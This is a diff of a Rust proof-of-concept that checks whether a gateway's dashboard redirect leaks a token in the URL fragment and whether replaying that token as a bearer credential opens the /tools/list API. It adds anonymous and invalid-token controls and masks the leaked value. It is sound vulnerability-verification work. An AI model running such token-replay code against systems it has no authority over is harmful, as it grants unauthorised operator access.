@@ -1,58 +1,104 @@
-// F1.rs — Dashboard Fragment Token Leak Proof
+// F1 - Dashboard fragment token leak.
+//
+// Hypothesis: the gateway hands the dashboard a credential inside the URL
+// fragment (`#...token=...`), and that same value is accepted as a bearer
+// credential on the HTTP API. Anything able to read the launched URL (browser
+// history, clipboard, a shared link, a screenshot) therefore obtains operator
+// access.
+//
+// What this program does NOT claim: it does not follow the redirect, does not
+// run JavaScript, and does not touch browser history. It reproduces the leak by
+// reading the redirect the gateway itself issues, then proves the leaked value
+// is a working credential by replaying it.
+//
+// Build:  rustc F1.rs -o F1
+// Run:    ./F1 [--host 127.0.0.1] [--port 18789] [--json]
 
-use std::io::{Read, Write};
-use std::net::TcpStream;
-use std::time::Duration;
+#![allow(dead_code, unused_imports)]
 
-const HOST: &str = "127.0.0.1";
-const PORT: u16 = 18789;
-
-fn http(req: &str) -> String {
-    let mut s = TcpStream::connect((HOST, PORT)).expect("connect to gateway");
-    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
-    s.write_all(req.as_bytes()).unwrap();
-    let mut buf = String::new();
-    let _ = s.read_to_string(&mut buf);
-    buf
-}
-
-fn status(resp: &str) -> u16 {
-    resp.lines().next().and_then(|l| l.split_whitespace().nth(1))
-        .and_then(|c| c.parse().ok()).unwrap_or(0)
-}
-
-fn fragment_token(url: &str) -> Option<String> {
-    let frag = url.split('#').nth(1)?;
-    for kv in frag.split('&') {
-        let (k, v) = kv.split_once('=').unwrap_or((kv, ""));
-        if k == "token" || k == "access_token" {
-            return Some(v.to_string());
-        }
-    }
-    None
-}
+include!("poc_support.rs");
 
 fn main() {
-    println!("[*] F1: Dashboard Fragment Token Leak Proof");
-    let boot = http(&format!("GET /dashboard/ HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n"));
-    let leaked_url = boot.lines()
-        .find(|l| l.to_ascii_lowercase().starts_with("location:") && l.contains('#'))
-        .map(|l| l.split('#').next_back().map(|f| format!("#{f}")).unwrap_or_default())
-        .or_else(|| {
-            let b = &boot;
-            let i = b.find("#/dash?token=").or_else(|| b.find("#access_token="))?;
-            let end = b[i..].find(|c: char| c == '"' || c == '\'' || c == '<').map(|e| i + e).unwrap_or(b.len());
-            Some(b[i..end].to_string())
-        });
-    let Some(url) = leaked_url else { eprintln!("[!] NO PROOF: no fragment URL"); std::process::exit(1); };
-    let Some(token) = fragment_token(&url) else { eprintln!("[!] NO PROOF: no token in fragment"); std::process::exit(1); };
-    let resp = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nAuthorization: Bearer {token}\r\nConnection: close\r\n\r\n"));
-    let code = status(&resp);
-    println!("[+] Token replay result: {code}");
-    if code != 401 && code != 0 {
-        println!("[+] PROOF: fragment token grants full gateway access");
-    } else {
-        eprintln!("[!] NO PROOF: token rejected");
-        std::process::exit(1);
+    let args = Args::parse();
+    let mut report = Report::new("F1", "Dashboard fragment token leak");
+    if !args.json {
+        banner("F1", "Dashboard fragment token leak");
+        println!("    target: {}", args.addr());
     }
+
+    // 1. Ask for the dashboard and read the redirect it issues.
+    let resp = match get(&args.host, args.port, "/dashboard/") {
+        Some(r) => r,
+        None => {
+            report.note(format!(
+                "no HTTP response from {} - is the gateway running there?",
+                args.addr()
+            ));
+            report.finish(args.json, 3);
+        }
+    };
+
+    let location = resp.header("location").unwrap_or("").to_string();
+    if location.is_empty() {
+        report.note(format!(
+            "status {} with no Location header: the dashboard did not hand out a URL",
+            resp.status
+        ));
+        report.finish(args.json, 1);
+    }
+    report.evidence(format!("dashboard redirect: {location}"));
+
+    let token = match token_from_fragment(&location) {
+        Some(t) => t,
+        None => {
+            report.note("redirect URL carries no token/access_token in its fragment");
+            report.finish(args.json, 1);
+        }
+    };
+    let shown = if token.len() > 6 {
+        format!("{}...{} ({} chars)", &token[..3], &token[token.len() - 3..], token.len())
+    } else {
+        format!("({} chars)", token.len())
+    };
+    report.evidence(format!("credential leaked in fragment: {shown}"));
+
+    // 2. Control: an unauthenticated read must be refused.
+    let anon = get(&args.host, args.port, "/tools/list");
+    let anon_status = anon.as_ref().map(|r| r.status).unwrap_or(0);
+    report.evidence(format!("baseline unauthenticated /tools/list -> HTTP {anon_status}"));
+
+    // 3. Replay the leaked value as a bearer credential.
+    let replay = get_bearer(&args.host, args.port, "/tools/list", &token);
+    let replay_status = replay.as_ref().map(|r| r.status).unwrap_or(0);
+    report.evidence(format!("replay of leaked value on /tools/list -> HTTP {replay_status}"));
+
+    // 4. A wrong token must fail, otherwise the endpoint ignores auth entirely
+    //    and the replay above would not be evidence of anything.
+    let bogus = get_bearer(&args.host, args.port, "/tools/list", "definitely-not-the-token");
+    let bogus_status = bogus.as_ref().map(|r| r.status).unwrap_or(0);
+    report.evidence(format!("control with an invalid token -> HTTP {bogus_status}"));
+
+    if bogus_status == 200 {
+        report.note(
+            "the control request with an invalid token also succeeded, so this target \
+             does not enforce auth and the replay proves nothing",
+        );
+        report.finish(args.json, 2);
+    }
+
+    if replay_status == 200 && anon_status != 200 {
+        report.evidence("the leaked fragment value is a working operator credential");
+        report.note(
+            "any party that can read the launched URL (history, clipboard, shared link) \
+             can replay it",
+        );
+        report.confirmed = true;
+        report.finish(args.json, 0);
+    }
+
+    report.note(format!(
+        "the leaked value was rejected (HTTP {replay_status}); it is not a usable credential \
+         on this target, so the leak carries no operator access"
+    ));
+    report.finish(args.json, 1);
 }
